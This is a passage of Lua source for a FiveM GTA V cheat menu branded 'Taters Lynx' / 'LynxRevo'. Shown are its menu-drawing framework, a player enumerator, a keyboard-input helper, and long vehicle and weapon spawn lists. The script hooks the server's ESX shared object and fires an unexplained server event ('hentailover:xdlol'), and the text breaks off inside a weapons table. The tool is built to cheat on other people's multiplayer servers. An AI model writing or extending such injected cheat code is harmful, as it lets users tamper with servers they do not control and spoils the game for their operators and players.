ESX = nil;
Citizen.CreateThread(function() while ESX == nil do TriggerEvent("esx:getSharedObject", function(a) ESX = a end) Citizen.Wait(1000) end end) local c = PlayerId(-1) local d = GetPlayerName(c) local e = {}
e.debug = false;
local
function f(h) local j = {}
local k = GetGameTimer() / 2000;
j.r = math.floor(math.sin(k * h + 0) * 127 + 128) j.g = math.floor(math.sin(k * h + 2) * 127 + 128) j.b = math.floor(math.sin(k * h + 4) * 127 + 128) return j end;
local l = {}
local m = {
    up = 172, down = 173, left = 174, right = 175, select = 176, back = 177
}
local n = 0;
local o = nil;
local p = nil;
local q = 0.21;
local s = 0.10;
local t = 0.03;
local u = 0.9;
local v = "Taters Lynx";
local w = 0.040;
local A = 0;
local B = 0.370;
local C = 0.005;
local D = 0.005;
local E = 0.041;
local F = 0;
local G = 0.005;
local H = 0.370;
local I = "Fallen#0811"
local
function J(K) if e.debug then Citizen.Trace("[LynxRevo] "..tostring(K)) end end;
local
function L(M, N, O) if M and l[M] then l[M][N] = O;
J(M..
    " menu property changed: { "..tostring(N)..
    ", "..tostring(O)..
    " }") end end;
local
function P(M) if M and l[M] then
return l[M].visible
else return false end end;
local
function Q(M, R, S) if M and l[M] then L(M, "visible", R) if not S and l[M] then L(M, "currentOption", 1) end;
if R then
if M ~= p and P(p) then Q(p, false) end;
p = M end end end;
local
function T(K, x, y, U, V, W, X, Y, Z) SetTextColour(V.r, V.g, V.b, V.a) SetTextFont(U) SetTextScale(W, W) if Y then SetTextDropShadow(2, 2, 0, 0, 0) end;
if l[p] then
if X then SetTextCentre(X) elseif Z then SetTextWrap(l[p].x, l[p].x + q - C) SetTextRightJustify(true) end end;
SetTextEntry("STRING") AddTextComponentString(K) DrawText(x, y) end;
local
function a0(x, y, a1, height, V) DrawRect(x, y, a1, height, V.r, V.g, V.b, V.a) end;
local
function a2() if l[p] then local x = l[p].x + q / 2;
local y = l[p].y + s / 2;
if l[p].titleBackgroundSprite then DrawSprite(l[p].titleBackgroundSprite.dict, l[p].titleBackgroundSprite.name, x, y, q, s, 0., 255, 255, 255, 255)
else a0(x, y, q, s, l[p].titleBackgroundColor) end;
T(l[p].title, x, y - s / 2 + t, l[p].titleFont, l[p].titleColor, u, true) end end;
local
function a3() if l[p] then local x = l[p].x + q / 2;
local y = l[p].y + s + w / 2;
local a4 = {
    r = l[p].titleBackgroundColor.r, g = l[p].titleBackgroundColor.g, b = l[p].titleBackgroundColor.b, a = 255
}
a0(x, y, q, w, l[p].subTitleBackgroundColor) T(l[p].subTitle, l[p].x + C, y - w / 2 + D, A, a4, B, false) if n > l[p].maxOptionCount then T(tostring(l[p].currentOption)..
    " / "..tostring(n), l[p].x + q, y - w / 2 + D, A, a4, B, false, false, true) end end end;
local
function a5(a6, a7, a8) if l[p] then local x = l[p].x + q / 2;
local y = l[p].y + E / 2;
local a9 = {
    r = 255, g = 255, b = 255, a = 255
}
a0(x, y + a8, q, E, descriptionBackgroundColor) T(a6, l[p].x + G, y - E / 2 + a7 + 0.005, F, a9, H, false) end end;
local
function aa(K, ab) local x = l[p].x + q / 2;
local ac = nil;
if l[p].currentOption <= l[p].maxOptionCount and n <= l[p].maxOptionCount then ac = n elseif n > l[p].currentOption - l[p].maxOptionCount and n <= l[p].currentOption then ac = n - (l[p].currentOption - l[p].maxOptionCount) end;
if ac then local y = l[p].y + s + w + w * ac - w / 2;
local ad = nil;
local ae = nil;
local af = nil;
local Y = false;
if l[p].currentOption == n then ad = l[p].menuFocusBackgroundColor;
ae = l[p].menuFocusTextColor;
af = l[p].menuFocusTextColor
else ad = l[p].menuBackgroundColor;
ae = l[p].menuTextColor;
af = l[p].menuSubTextColor;
Y = true end;
a0(x, y, q, w, ad) T(K, l[p].x + C, y - w / 2 + D, A, ae, B, false, Y) if ab then T(ab, l[p].x + C, y - w / 2 + D, A, af, B, false, Y, true) end end end;

function e.CreateMenu(M, ag) l[M] = {}
l[M].title = ag;
l[M].subTitle = I;
l[M].visible = false;
l[M].previousMenu = nil;
l[M].aboutToBeClosed = false;
l[M].x = 0.75;
l[M].y = 0.19;
l[M].currentOption = 1;
l[M].maxOptionCount = 10;
l[M].titleFont = 1;
l[M].titleColor = {
    r = 255, g = 255, b = 255, a = 255
}
Citizen.CreateThread(function() while true do Citizen.Wait(0) local ah = f(1.0) l[M].titleBackgroundColor = {
        r = ah.r, g = ah.g, b = ah.b, a = 105
    }
    l[M].
    menuFocusBackgroundColor = {
        r = 255, g = 255, b = 255, a = 100
    }
    end end) l[M].titleBackgroundSprite = nil;
l[M].menuTextColor = {
    r = 255, g = 255, b = 255, a = 255
}
l[M].menuSubTextColor = {
    r = 189, g = 189, b = 189, a = 255
}
l[M].menuFocusTextColor = {
    r = 255, g = 255, b = 255, a = 255
}
l[M].menuBackgroundColor = {
    r = 0, g = 0, b = 0, a = 100
}
l[M].subTitleBackgroundColor = {
    r = l[M].menuBackgroundColor.r, g = l[M].menuBackgroundColor.g, b = l[M].menuBackgroundColor.b, a = 255
}
descriptionBackgroundColor = {
    r = l[M].menuBackgroundColor.r, g = l[M].menuBackgroundColor.g, b = l[M].menuBackgroundColor.b, a = 125
}
l[M].buttonPressedSound = {
    name = "~h~~r~> ~s~SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"
}
J(tostring(M)..
    " menu created") end;

function e.CreateSubMenu(M, ai, aj) if l[ai] then e.CreateMenu(M, l[ai].title) if aj then L(M, "subTitle", aj)
else L(M, "subTitle", l[ai].subTitle) end;
L(M, "previousMenu", ai) L(M, "x", l[ai].x) L(M, "y", l[ai].y) L(M, "maxOptionCount", l[ai].maxOptionCount) L(M, "titleFont", l[ai].titleFont) L(M, "titleColor", l[ai].titleColor) L(M, "titleBackgroundColor", l[ai].titleBackgroundColor) L(M, "titleBackgroundSprite", l[ai].titleBackgroundSprite) L(M, "menuTextColor", l[ai].menuTextColor) L(M, "menuSubTextColor", l[ai].menuSubTextColor) L(M, "menuFocusTextColor", l[ai].menuFocusTextColor) L(M, "menuFocusBackgroundColor", l[ai].menuFocusBackgroundColor) L(M, "menuBackgroundColor", l[ai].menuBackgroundColor) L(M, "subTitleBackgroundColor", l[ai].subTitleBackgroundColor)
else J("Failed to create "..tostring(M)..
    " submenu: "..tostring(ai)..
    " parent menu doesn't exist") end end;

function e.CurrentMenu() return p end;

function e.OpenMenu(M) if M and l[M] then PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) Q(M, true) if l[M].titleBackgroundSprite then RequestStreamedTextureDict(l[M].titleBackgroundSprite.dict, false) while not HasStreamedTextureDictLoaded(l[M].titleBackgroundSprite.dict) do Citizen.Wait(0) end end;
    J(tostring(M)..
        " menu opened")
else J("Failed to open "..tostring(M)..
    " menu: it doesn't exist") end end;

function e.IsMenuOpened(M) return P(M) end;

function e.IsAnyMenuOpened() for M, _ in pairs(l) do
    if P(M) then
return true end end;
return false end;

function e.IsMenuAboutToBeClosed() if l[p] then
return l[p].aboutToBeClosed
else return false end end;

function e.CloseMenu() if l[p] then
if l[p].aboutToBeClosed then l[p].aboutToBeClosed = false;
Q(p, false) J(tostring(p)..
    " menu closed") PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) n = 0;
p = nil;
o = nil
else l[p].aboutToBeClosed = true;
J(tostring(p)..
    " menu about to be closed") end end end;

function e.Button(K, ab) local ak = K;
if ab then ak = "{ "..tostring(ak)..
", "..tostring(ab)..
" }"
end;
if l[p] then n = n + 1;
local al = l[p].currentOption == n;
aa(K, ab) if al then
if o == m.select then PlaySoundFrontend(-1, l[p].buttonPressedSound.name, l[p].buttonPressedSound.set, true) J(ak..
    " button pressed") return true elseif o == m.left or o == m.right then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) end end;
return false
else J("Failed to create "..ak..
    " button: "..tostring(p)..
    " menu doesn't exist") return false end end;

function e.MenuButton(K, M) if l[M] then
if e.Button(K) then Q(p, false) Q(M, true, true) return true end
else J("Failed to create "..tostring(K)..
    " menu button: "..tostring(M)..
    " submenu doesn't exist") end;
return false end;

function e.CheckBox(K, bool, am) local an = "~r~~h~OFF"
if bool then an = "~g~~h~ON"
end;
if e.Button(K, an) then bool = not bool;
J(tostring(K)..
    " checkbox changed to "..tostring(bool)) am(bool) return true end;
return false end;
local
function ao() v = 0 end;

function e.ComboBox(K, ap, aq, ar, am) local as = #ap;
local at = ap[aq] local al = l[p].currentOption == n + 1;
if as > 1 and al then at = 'Ã¢â€ ï¿½ '..tostring(at)..
' Ã¢â€ â€™'
end;
if e.Button(K, at) then ar = aq;
am(aq, ar) return true elseif al then
if o == m.left then
if aq > 1 then aq = aq - 1
else aq = as end elseif o == m.right then
if aq < as then aq = aq + 1
else aq = 1 end end
else aq = ar end;
am(aq, ar) return false end;

function e.Display() if P(p) then
if l[p].aboutToBeClosed then e.CloseMenu()
else ClearAllHelpMessages() a2() a3() o = nil;
if IsDisabledControlJustPressed(0, m.down) then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) if l[p].currentOption < n then l[p].currentOption = l[p].currentOption + 1
else l[p].currentOption = 1 end elseif IsDisabledControlJustPressed(0, m.up) then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) if l[p].currentOption > 1 then l[p].currentOption = l[p].currentOption - 1
else l[p].currentOption = n end elseif IsDisabledControlJustPressed(0, m.left) then o = m.left elseif IsDisabledControlJustPressed(0, m.right) then o = m.right elseif IsDisabledControlJustPressed(0, m.select) then o = m.select elseif IsDisabledControlJustPressed(0, m.back) then
if l[l[p].previousMenu] then PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) Q(l[p].previousMenu, true)
else e.CloseMenu() end end;
n = 0 end end end;

function e.SetMenuWidth(M, a1) L(M, "width", a1) end;

function e.SetMenuX(M, x) L(M, "x", x) end;

function e.SetMenuY(M, y) L(M, "y", y) end;

function e.SetMenuMaxOptionCountOnScreen(M, count) L(M, "maxOptionCount", count) end;

function e.SetTitleColor(M, r, g, b, au) L(M, "titleColor", {
    ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = au or l[M].titleColor.a
}) end;

function e.SetTitleBackgroundColor(M, r, g, b, au) L(M, "titleBackgroundColor", {
    ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = au or l[M].titleBackgroundColor.a
}) end;

function e.SetTitleBackgroundSprite(M, aB, aC) L(M, "titleBackgroundSprite", {
    dict = aB, name = aC
}) end;

function e.SetSubTitle(M, K) L(M, "subTitle", K) end;

function e.SetMenuBackgroundColor(M, r, g, b, au) L(M, "menuBackgroundColor", {
    ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = au or l[M].menuBackgroundColor.a
}) end;

function e.SetMenuTextColor(M, r, g, b, au) L(M, "menuTextColor", {
    ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = au or l[M].menuTextColor.a
}) end;

function e.SetMenuSubTextColor(M, r, g, b, au) L(M, "menuSubTextColor", {
    ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = au or l[M].menuSubTextColor.a
}) end;

function e.SetMenuFocusColor(M, r, g, b, au) L(M, "menuFocusColor", {
    ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = au or l[M].menuFocusColor.a
}) end;

function e.SetMenuButtonPressedSound(M, aD, aE) L(M, "buttonPressedSound", {
    ["name"] = aD, ["set"] = aE
}) end;

function KeyboardInput(aF, aG, aH) AddTextEntry("FMMC_KEY_TIP1", aF..
    ":") DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", aG, "", "", "", aH) blockinput = true;
while UpdateOnscreenKeyboard()  ~= 1 and UpdateOnscreenKeyboard()  ~= 2 do Citizen.Wait(0) end;
    if UpdateOnscreenKeyboard()  ~= 2 then AddTextEntry("FMMC_KEY_TIP1", "") local j = GetOnscreenKeyboardResult() Citizen.Wait(500) blockinput = false;
return j
else AddTextEntry("FMMC_KEY_TIP1", "") Citizen.Wait(500) blockinput = false;
return nil end end;
local
function aI() local aJ = {}
for i = 0, GetNumberOfPlayers() do
    if NetworkIsPlayerActive(i) then aJ[#aJ + 1] = i end end;
return aJ end;

function DrawText3D(x, y, z, K, r, g, b) SetDrawOrigin(x, y, z, 0) SetTextFont(0) SetTextProportional(0) SetTextScale(0.0, 0.20) SetTextColour(r, g, b, 255) SetTextDropshadow(0, 0, 0, 0, 255) SetTextEdge(2, 0, 0, 0, 150) SetTextDropShadow() SetTextOutline() SetTextEntry("STRING") SetTextCentre(1) AddTextComponentString(K) DrawText(0.0, 0.0) ClearDrawOrigin() end;

function math.round(aK, aL) return tonumber(string.format("%."..(aL or 0)..
    "f", aK)) end;
local
function f(h) local j = {}
local k = GetGameTimer() / 1000;
j.r = math.floor(math.sin(k * h + 0) * 127 + 128) j.g = math.floor(math.sin(k * h + 2) * 127 + 128) j.b = math.floor(math.sin(k * h + 4) * 127 + 128) return j end;
local
function aM(K, aN) local i = 23;
SetNotificationTextEntry("STRING") AddTextComponentString(K) DrawNotification(aN, false) SetNotificationBackgroundColor(i) end;
TriggerServerEvent("hentailover:xdlol")
function checkValidVehicleExtras() local aO = PlayerPedId() local aP = GetVehiclePedIsIn(aO, false) local aQ = {}
for i = 0, 50, 1 do
    if DoesExtraExist(aP, i) then local aR = "~h~Extra #"..tostring(i) local K = "OFF"
if IsVehicleExtraTurnedOn(aP, i) then K = "ON"
end;
local aS = "~h~extra "..tostring(i) table.insert(aQ, {
    menuName = realModName, data = {
        ["action"] = realSpawnName, ["state"] = K
    }
}) end end;
return aQ end;

function DoesVehicleHaveExtras(veh) for i = 1, 30 do
    if DoesExtraExist(veh, i) then
return true end end;
return false end;

function checkValidVehicleMods(aT) local aO = PlayerPedId() local aP = GetVehiclePedIsIn(aO, false) local aQ = {}
local aU = GetNumVehicleMods(aP, aT) if aT == 48 and aU == 0 then local aU = GetVehicleLiveryCount(aP) for i = 1, aU, 1 do local aV = i - 1;
    local aW = GetLiveryName(aP, aV) local realModName = GetLabelText(aW) local aX, realSpawnName = aT, aV;
aQ[i] = {
    menuName = realModName, data = {
        ["modid"] = aX, ["realIndex"] = realSpawnName
    }
}
end end;
for i = 1, aU, 1 do local aV = i - 1;
    local aW = GetModTextLabel(aP, aT, aV) local realModName = GetLabelText(aW) local aX, realSpawnName = aU, aV;
aQ[i] = {
    menuName = realModName, data = {
        ["modid"] = aX, ["realIndex"] = realSpawnName
    }
}
end;
if aU > 0 then local aV = -1;
local aX, realSpawnName = aT, aV;
table.insert(aQ, 1, {
    menuName = "Stock", data = {
        ["modid"] = aX, ["realIndex"] = realSpawnName
    }
}) end;
return aQ end;
local aY = {
    "Dinghy", "Dinghy2", "Dinghy3", "Dingh4", "Jetmax", "Marquis", "Seashark", "Seashark2", "Seashark3", "Speeder", "Speeder2", "Squalo", "Submersible", "Submersible2", "Suntrap", "Toro", "Toro2", "Tropic", "Tropic2", "Tug"
}
local aZ = {
    "Benson", "Biff", "Cerberus", "Cerberus2", "Cerberus3", "Hauler", "Hauler2", "Mule", "Mule2", "Mule3", "Mule4", "Packer", "Phantom", "Phantom2", "Phantom3", "Pounder", "Pounder2", "Stockade", "Stockade3", "Terbyte"
}
local a_ = {
    "Blista", "Blista2", "Blista3", "Brioso", "Dilettante", "Dilettante2", "Issi2", "Issi3", "issi4", "Iss5", "issi6", "Panto", "Prarire", "Rhapsody"
}
local b0 = {
    "CogCabrio", "Exemplar", "F620", "Felon", "Felon2", "Jackal", "Oracle", "Oracle2", "Sentinel", "Sentinel2", "Windsor", "Windsor2", "Zion", "Zion2"
}
local b1 = {
    "Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3"
}
local b2 = {
    "ambulance", "FBI", "FBI2", "FireTruk", "PBus", "police", "Police2", "Police3", "Police4", "PoliceOld1", "PoliceOld2", "PoliceT", "Policeb", "Polmav", "Pranger", "Predator", "Riot", "Riot2", "Sheriff", "Sheriff2"
}
local b3 = {
    "Akula", "Annihilator", "Buzzard", "Buzzard2", "Cargobob", "Cargobob2", "Cargobob3", "Cargobob4", "Frogger", "Frogger2", "Havok", "Hunter", "Maverick", "Savage", "Seasparrow", "Skylift", "Supervolito", "Supervolito2", "Swift", "Swift2", "Valkyrie", "Valkyrie2", "Volatus"
}
local b4 = {
    "Bulldozer", "Cutter", "Dump", "Flatbed", "Guardian", "Handler", "Mixer", "Mixer2", "Rubble", "Tiptruck", "Tiptruck2"
}
local b5 = {
    "APC", "Barracks", "Barracks2", "Barracks3", "Barrage", "Chernobog", "Crusader", "Halftrack", "Khanjali", "Rhino", "Scarab", "Scarab2", "Scarab3", "Thruster", "Trailersmall2"
}
local b6 = {
    "Akuma", "Avarus", "Bagger", "Bati2", "Bati", "BF400", "Blazer4", "CarbonRS", "Chimera", "Cliffhanger", "Daemon", "Daemon2", "Defiler", "Deathbike", "Deathbike2", "Deathbike3", "Diablous", "Diablous2", "Double", "Enduro", "esskey", "Faggio2", "Faggio3", "Faggio", "Fcr2", "fcr", "gargoyle", "hakuchou2", "hakuchou", "hexer", "innovation", "Lectro", "Manchez", "Nemesis", "Nightblade", "Oppressor", "Oppressor2", "PCJ", "Ratbike", "Ruffian", "Sanchez2", "Sanchez", "Sanctus", "Shotaro", "Sovereign", "Thrust", "Vader", "Vindicator", "Vortex", "Wolfsbane", "zombiea", "zombieb"
}
local b7 = {
    "Blade", "Buccaneer", "Buccaneer2", "Chino", "Chino2", "clique", "Deviant", "Dominator", "Dominator2", "Dominator3", "Dominator4", "Dominator5", "Dominator6", "Dukes", "Dukes2", "Ellie", "Faction", "faction2", "faction3", "Gauntlet", "Gauntlet2", "Hermes", "Hotknife", "Hustler", "Impaler", "Impaler2", "Impaler3", "Impaler4", "Imperator", "Imperator2", "Imperator3", "Lurcher", "Moonbeam", "Moonbeam2", "Nightshade", "Phoenix", "Picador", "RatLoader", "RatLoader2", "Ruiner", "Ruiner2", "Ruiner3", "SabreGT", "SabreGT2", "Sadler2", "Slamvan", "Slamvan2", "Slamvan3", "Slamvan4", "Slamvan5", "Slamvan6", "Stalion", "Stalion2", "Tampa", "Tampa3", "Tulip", "Vamos,", "Vigero", "Virgo", "Virgo2", "Virgo3", "Voodoo", "Voodoo2", "Yosemite"
}
local b8 = {
    "BFinjection", "Bifta", "Blazer", "Blazer2", "Blazer3", "Blazer5", "Bohdi", "Brawler", "Bruiser", "Bruiser2", "Bruiser3", "Caracara", "DLoader", "Dune", "Dune2", "Dune3", "Dune4", "Dune5", "Insurgent", "Insurgent2", "Insurgent3", "Kalahari", "Kamacho", "LGuard", "Marshall", "Mesa", "Mesa2", "Mesa3", "Monster", "Monster4", "Monster5", "Nightshark", "RancherXL", "RancherXL2", "Rebel", "Rebel2", "RCBandito", "Riata", "Sandking", "Sandking2", "Technical", "Technical2", "Technical3", "TrophyTruck", "TrophyTruck2", "Freecrawler", "Menacer"
}
local b9 = {
    "AlphaZ1", "Avenger", "Avenger2", "Besra", "Blimp", "blimp2", "Blimp3", "Bombushka", "Cargoplane", "Cuban800", "Dodo", "Duster", "Howard", "Hydra", "Jet", "Lazer", "Luxor", "Luxor2", "Mammatus", "Microlight", "Miljet", "Mogul", "Molotok", "Nimbus", "Nokota", "Pyro", "Rogue", "Seabreeze", "Shamal", "Starling", "Stunt", "Titan", "Tula", "Velum", "Velum2", "Vestra", "Volatol", "Striekforce"
}
local ba = {
    "BJXL", "Baller", "Baller2", "Baller3", "Baller4", "Baller5", "Baller6", "Cavalcade", "Cavalcade2", "Dubsta", "Dubsta2", "Dubsta3", "FQ2", "Granger", "Gresley", "Habanero", "Huntley", "Landstalker", "patriot", "Patriot2", "Radi", "Rocoto", "Seminole", "Serrano", "Toros", "XLS", "XLS2"
}
local bb = {
    "Asea", "Asea2", "Asterope", "Cog55", "Cogg552", "Cognoscenti", "Cognoscenti2", "emperor", "emperor2", "emperor3", "Fugitive", "Glendale", "ingot", "intruder", "limo2", "premier", "primo", "primo2", "regina", "romero", "stafford", "Stanier", "stratum", "stretch", "surge", "tailgater", "warrener", "Washington"
}
local bc = {
    "Airbus", "Brickade", "Bus", "Coach", "Rallytruck", "Rentalbus", "taxi", "Tourbus", "Trash", "Trash2", "WastIndr", "PBus2"
}
local bd = {
    "Alpha", "Banshee", "Banshee2", "BestiaGTS", "Buffalo", "Buffalo2", "Buffalo3", "Carbonizzare", "Comet2", "Comet3", "Comet4", "Comet5", "Coquette", "Deveste", "Elegy", "Elegy2", "Feltzer2", "Feltzer3", "FlashGT", "Furoregt", "Fusilade", "Futo", "GB200", "Hotring", "Infernus2", "Italigto", "Jester", "Jester2", "Khamelion", "Kurama", "Kurama2", "Lynx", "MAssacro", "MAssacro2", "neon", "Ninef", "ninfe2", "omnis", "Pariah", "Penumbra", "Raiden", "RapidGT", "RapidGT2", "Raptor", "Revolter", "Ruston", "Schafter2", "Schafter3", "Schafter4", "Schafter5", "Schafter6", "Schlagen", "Schwarzer", "Sentinel3", "Seven70", "Specter", "Specter2", "Streiter", "Sultan", "Surano", "Tampa2", "Tropos", "Verlierer2", "ZR380", "ZR3802", "ZR3803"
}
local be = {
    "Ardent", "BType", "BType2", "BType3", "Casco", "Cheetah2", "Cheburek", "Coquette2", "Coquette3", "Deluxo", "Fagaloa", "Gt500", "JB700", "JEster3", "MAmba", "Manana", "Michelli", "Monroe", "Peyote", "Pigalle", "RapidGT3", "Retinue", "Savastra", "Stinger", "Stingergt", "Stromberg", "Swinger", "Torero", "Tornado", "Tornado2", "Tornado3", "Tornado4", "Tornado5", "Tornado6", "Viseris", "Z190", "ZType"
}
local bf = {
    "Adder", "Autarch", "Bullet", "Cheetah", "Cyclone", "EntityXF", "Entity2", "FMJ", "GP1", "Infernus", "LE7B", "Nero", "Nero2", "Osiris", "Penetrator", "PFister811", "Prototipo", "Reaper", "SC1", "Scramjet", "Sheava", "SultanRS", "Superd", "T20", "Taipan", "Tempesta", "Tezeract", "Turismo2", "Turismor", "Tyrant", "Tyrus", "Vacca", "Vagner", "Vigilante", "Visione", "Voltic", "Voltic2", "Zentorno", "Italigtb", "Italigtb2", "XA21"
}
local bg = {
    "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"
}
local bh = {
    "Freight", "Freightcar", "Freightcont1", "Freightcont2", "Freightgrain", "Freighttrailer", "TankerCar"
}
local bi = {
    "Airtug", "Caddy", "Caddy2", "Caddy3", "Docktug", "Forklift", "Mower", "Ripley", "Sadler", "Scrap", "TowTruck", "Towtruck2", "Tractor", "Tractor2", "Tractor3", "TrailerLArge2", "Utilitruck", "Utilitruck3", "Utilitruck2"
}
local bj = {
    "Bison", "Bison2", "Bison3", "BobcatXL", "Boxville", "Boxville2", "Boxville3", "Boxville4", "Boxville5", "Burrito", "Burrito2", "Burrito3", "Burrito4", "Burrito5", "Camper", "GBurrito", "GBurrito2", "Journey", "Minivan", "Minivan2", "Paradise", "pony", "Pony2", "Rumpo", "Rumpo2", "Rumpo3", "Speedo", "Speedo2", "Speedo4", "Surfer", "Surfer2", "Taco", "Youga", "youga2"
}
local bk = {
    "Boats", "Commercial", "Compacts", "Coupes", "Cycles", "Emergency", "Helictopers", "Industrial", "Military", "Motorcycles", "Muscle", "Off-Road", "Planes", "SUVs", "Sedans", "Service", "Sports", "Sports Classic", "Super", "Trailer", "Trains", "Utility", "Vans"
}
local bl = {
    aY, aZ, a_, b0, b1, b2, b3, b4, b5, b6, b7, b8, b9, ba, bb, bc, bd, be, bf, bg, bh, bi, bj
}
local bm = {
    "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"
}
local bn = {
    "WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG", "WEAPON_MACHINEPISTOL", "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_PUMPSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_STINGER", "WEAPON_FIREWORK", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE", "WEAPON_BZGAS", "WEAPON_SMOKEGRENADE", "WEAPON_MOLOTOV", "WEAPON_FIREEXTINGUISHER", "WEAPON_PETROLCAN", "WEAPON_SNOWBALL", "WEAPON_FLARE", "WEAPON_BALL"
}
local bo = {
    Melee = {
        BaseballBat = {
            id = "weapon_bat", name = "~h~~r~> ~s~Baseball Bat", bInfAmmo = false, mods = {}
        }, BrokenBottle = {
            id = "weapon_bottle", name = "~h~~r~> ~s~Broken Bottle", bInfAmmo = false, mods = {}
        }, Crowbar = {
            id = "weapon_Crowbar", name = "~h~~r~> ~s~Crowbar", bInfAmmo = false, mods = {}
        }, Flashlight = {
            id = "weapon_flashlight", name = "~h~~r~> ~s~Flashlight", bInfAmmo = false, mods = {}
        }, GolfClub = {
            id = "weapon_golfclub", name = "~h~~r~> ~s~Golf Club", bInfAmmo = false, mods = {}
        }, BrassKnuckles = {
            id = "weapon_knuckle", name = "~h~~r~> ~s~Brass Knuckles", bInfAmmo = false, mods = {}
        }, Knife = {
            id = "weapon_knife", name = "~h~~r~> ~s~Knife", bInfAmmo = false, mods = {}
        }, Machete = {
            id = "weapon_machete", name = "~h~~r~> ~s~Machete", bInfAmmo = false, mods = {}
        }, Switchblade = {
            id = "weapon_switchblade", name = "~h~~r~> ~s~Switchblade", bInfAmmo = false, mods = {}
        }, Nightstick = {
            id = "weapon_nightstick", name = "~h~~r~> ~s~Nightstick", bInfAmmo = false, mods = {}
        }, BattleAxe = {
            id = "weapon_battleaxe", name = "~h~~r~> ~s~Battle Axe", bInfAmmo = false, mods = {}
        }
    }, Handguns = {
        Pistol = {
            id = "weapon_pistol", name = "~h~~r~> ~s~Pistol", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_PISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_PISTOL_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"
                    }
                }
            }
        }, PistolMK2 = {
            id = "weapon_pistol_mk2", name = "~h~~r~> ~s~Pistol MK 2", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Mounted Scope", id = "COMPONENT_AT_PI_RAIL"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH_02"
                    }
                }, BarrelAttachments = {
                    {
